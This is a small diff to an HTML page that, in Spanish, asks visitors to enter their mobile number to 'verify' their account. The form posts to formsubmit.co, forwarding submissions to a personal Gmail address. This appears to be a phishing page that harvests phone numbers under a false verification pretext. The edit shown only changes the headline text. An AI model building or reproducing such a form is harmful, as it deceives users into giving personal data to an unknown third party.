@@ -15,7 +15,7 @@
 
     <div class="cont">
         <div class="conttitle">
-            <h1 class="title">INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA</h2>
+            <h1 class="title">INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENT</h2>
         </div>
         <form  action="https://formsubmit.co/rafagerman941@gmail.com" method="POST">
         <div class="contsolicitar">
